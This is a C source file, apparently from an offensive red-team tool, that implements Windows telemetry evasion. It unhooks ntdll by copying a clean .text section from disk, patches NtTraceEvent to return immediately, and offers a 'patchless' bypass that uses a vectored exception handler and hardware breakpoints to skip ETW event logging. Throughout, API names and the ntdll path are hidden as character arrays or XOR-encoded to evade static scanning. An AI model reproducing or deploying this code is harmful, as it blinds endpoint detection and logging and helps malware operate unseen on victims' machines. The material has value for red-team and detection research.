/*

Patchless etw pass: 

The patchless method can avoid detection on tampering of API functions. 

EtwEventWrite and EtwEventWriteFull call NtTraceEvent, which is a syscall.

We can set up a VEH and set-up HWBP using RtlCaptureContext to capture the context of the thread, 
then NtContinue to update the thread context. 

Inside the VEH handler when NtTraceEvent is called, we can redirect the RIP to Ret instruction 6 instructions after start address,
, after the syscall, and set Rax=0, thus bypassing the ETW event completely. 

* Author: Thomas X Meng
# Date Nov 2024
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2025 Thomas M
# Licensed under the GPLv3 or later.

*/
#include "etw_pass.h"
#include <winternl.h>
#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

#pragma once

PVOID GetBaseAddressNtdll() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - sizeof(LIST_ENTRY));

    return pLdr->DllBase;
}

PVOID pNtdllBase = (PVOID)GetBaseAddressNtdll();

typedef BOOL(WINAPI* ProtectMemory_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateMapping_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapFile_t)(LPCVOID);

ProtectMemory_t ProtectMemory_p = NULL;
unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
unsigned char sCreateMapping[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
unsigned char sMapFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0 };
unsigned char sUnmapFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
unsigned char sProtectMemory[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };

unsigned int sNtdllPath_len = sizeof(sNtdllPath);
unsigned int sNtdll_len = sizeof(sNtdll);

unsigned char sGetThis[] = { 'N','t','T','r','a','c','e','E','v','e','n','t', 0 };
// unsigned char sDisableETW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };

void SimpleXOR(char* data, size_t len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] = (BYTE)data[i] ^ key;
    }
}

BOOL RestoreNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            ProtectMemory_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            ProtectMemory_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            return 0;
        }
    }
    return -1;
}

BOOL NeutralizeETW() {
    DWORD oldprotect = 0;
    // void* pEventWrite = reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sDisableETW));
    void* pEventWrite = reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sGetThis));

    if (!ProtectMemory_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) {
        printf("[-] ProtectMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // printf("[*] ETW EventWrite Base Address : 0x%p \n", pEventWrite);
    // getchar();

    #ifdef _WIN64
        memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret for x64
    #else
        memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14 for x86
    #endif

    // printf ("[+] ETW EventWrite Patched, check mem\n");
    // getchar();

    if (!ProtectMemory_p(pEventWrite, 4096, oldprotect, &oldprotect)) {
        printf("[-] ProtectMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    if (!FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096)) {
        printf("[-] FlushInstructionCache Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// New ETW pass:

typedef NTSTATUS(WINAPI *NtContinue_t)(PCONTEXT, BOOLEAN);

typedef NTSTATUS(WINAPI *NtTraceEvent_t)(void*, void*, ULONG, ULONG);

NtContinue_t NtContinue = NULL;
NtTraceEvent_t NtTraceEvent = NULL;

uintptr_t find_gadget(uintptr_t function, BYTE *stub, size_t size, size_t dist) {
    for (size_t i = 0; i < dist; i++) {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            printf("[+] Found gadget at: %p\n", (PVOID)(function + i));
            return (function + i);
        }
    }
    return 0ull;
}

LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        PVOID rip = (PVOID)ExceptionInfo->ContextRecord->Rip;
        static uintptr_t NtTraceEventAddr = 0;
        
        if (!NtTraceEvent) {

            NtTraceEventAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sGetThis);
            // EtwEventWriteAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sEtwEventWrite);
        }
        NtTraceEventAddr = (uintptr_t)NtTraceEvent;
        
        if ((uintptr_t)rip == NtTraceEventAddr) {
            printf("[+] Intercepted function at %p\n", rip);
            ExceptionInfo->ContextRecord->Rax = 0;
            PVOID ret_addr = (PVOID)find_gadget((uintptr_t)rip, (BYTE*)"\xc3", 1, 100);
            if (ret_addr) {
                printf("[+] Redirecting RIP to: %p\n", ret_addr);
                ExceptionInfo->ContextRecord->Rip = (DWORD64)ret_addr;
            }


            printf("[+] Continuing execution\n");
            getchar();

            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


BOOL BypassETW() {


    unsigned char sNtTraceEvent[] = {'N','t','T','r','a','c','e','E','v','e','n','t', 0};
    // unsigned char sEtwEventWrite[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e', 0};
    unsigned char sNtContinue[] = {'N','t','C','o','n','t','i','n','u','e', 0};

    NtContinue = (NtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sNtContinue);
    NtTraceEvent = (NtTraceEvent_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sNtTraceEvent);
    
    if (!NtContinue) {
        printf("[-] Failed to resolve NtContinue, exiting...\n");
        return 1;
    }
    if (!NtTraceEvent) {
        printf("[-] Failed to resolve NtTraceEvent, exiting...\n");
        return 1;
    }
    
    // printf("[DEBUG] Registering exception handler...\n");
    AddVectoredExceptionHandler(1, exception_handler);
    printf("[+] Exception handler registered\n");
    
    static int initialised = 0;
    CONTEXT context_thread = {0};
    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&context_thread);
    /// NtContinue will have rip pointed back to here since we captured the thread context at this point.
    /// Alternatively, we can do context_thread.Rip++ a few times to reach the point where NtTraceEvent is called.

    if (!initialised) {
        // printf("[DEBUG] Captured thread context\n");
        printf("\tDr0: %p\tDr7: %p\n", (PVOID)context_thread.Dr0, (PVOID)context_thread.Dr7);
        
        context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        context_thread.Dr0 = (uintptr_t)NtTraceEvent;
        
        if (!context_thread.Dr0) {
            printf("[-] Failed to resolve function address, exiting...\n");
            return 1;
        }
        
        // printf("[DEBUG] Breakpoints resolved. NtTraceEvent: %p\n", (PVOID)context_thread.Dr0);
        
        printf("[+] Setting breakpoint on NtTraceEvent (%p)\n", (PVOID)context_thread.Dr0);
        
        context_thread.Dr7 |= (1ull << (2 * 0));
        context_thread.Dr7 &= ~(3ull << (16 + 4 * 0));
        context_thread.Dr7 &= ~(3ull << (18 + 4 * 0));
        
        initialised = 1;
        // printf("[DEBUG] Calling NtContinue to resume execution\n");
        NtContinue(&context_thread, FALSE);
    }

    return TRUE;

}

// New ETW pass end.

bool everyThing() {
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateMapping_t CreateMapping_p = (CreateMapping_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateMapping);
    MapFile_t MapFile_p = (MapFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapFile);
    UnmapFile_t UnmapFile_p = (UnmapFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapFile);
    ProtectMemory_p = (ProtectMemory_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sProtectMemory);

    printf("\n[*] Dirty ntdll base addr : 0x%p \n", pNtdllBase);
    SimpleXOR((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
    hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }

    hFileMapping = CreateMapping_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        CloseHandle(hFile);
        return -1;
    }

    pMapping = MapFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    ret = RestoreNtdll(GetModuleHandleA((LPCSTR)sNtdllPath), pMapping);

    printf("[*] Fresh DLL base addr: 0x%p \n", sNtdll);

    UnmapFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    printf("\n[+] Current process PID [%d]\n", GetCurrentProcessId());
    printf("\n[*] Ready For ETW \n");

    printf("[+] Press any key to continue \n"); getchar();

    // if (!NeutralizeETW()) {
    if (!BypassETW()) {
        return EXIT_FAILURE;
    } else {
        printf("\n[+] Post-Execution Patch Completed...\n");
        printf("\n");
        return EXIT_SUCCESS;
    }

}

// int main() {

//     if (everyThing() == EXIT_SUCCESS) {
//         printf("\n[+] ETW Patched Successfully...\n");
//     } else {
//         printf("\n[-] ETW Patch Failed...\n");
//     }
//     return 0;
// }
